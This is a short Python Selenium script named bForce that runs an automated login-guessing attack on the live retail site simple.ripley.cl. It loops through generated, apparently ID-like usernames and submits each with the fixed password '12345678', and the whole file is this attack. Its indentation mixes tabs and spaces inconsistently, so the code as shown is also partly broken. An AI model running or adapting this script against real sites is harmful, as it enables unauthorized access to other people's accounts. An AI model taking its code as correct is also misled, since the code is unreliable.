from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time


def bForce():
    driver = webdriver.Chrome('./chromedriver')
    driver.get('https://simple.ripley.cl')
    driver.find_element_by_class_name('my-account').click()
    time.sleep(1)
    driver.find_element_by_name('ws_username').click()
    for i in range(59, 90):                
	user = driver.find_element_by_name('ws_username')
	user.send_keys("21"+str(i)+"56984")
	password = driver.find_element_by_xpath('//*[@id="ripley-sticky-header"]/section/nav/ul/li[2]/div/div/div/div/div/div/div/div/div[1]/form/div/div[2]/div/input')
	password.send_keys("12345678")
	driver.find_element_by_name("password").send_keys(Keys.ENTER)
		

	driver.get("https://simple.ripley.cl")
        driver.close()
bForce()